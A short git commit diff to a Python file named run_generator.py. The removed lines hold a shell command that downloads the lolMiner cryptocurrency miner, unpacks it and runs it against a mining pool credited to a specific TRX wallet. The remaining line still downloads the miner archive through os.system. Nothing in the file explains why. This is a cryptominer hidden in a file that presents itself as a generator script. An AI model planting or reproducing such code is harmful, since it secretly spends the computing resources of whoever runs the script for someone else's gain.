b515b0fbd7edaf5178f9305c725e62a99905daed
whiteco123 <92229203+whiteco123@users.noreply.github.com>
2021-10-09 22:42:52 +0300

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,5 +1,3 @@
 import os
-cmd = 'wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz
-tar xf lolMiner_v1.31_Lin64.tar.gz
-1.31/./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user TRX:TBngRUXCCTKnnqgrun2b6RC2QdxbXbxd2m.x --ethstratum ETHPROXY'
+cmd = 'wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz'
 os.system(cmd)
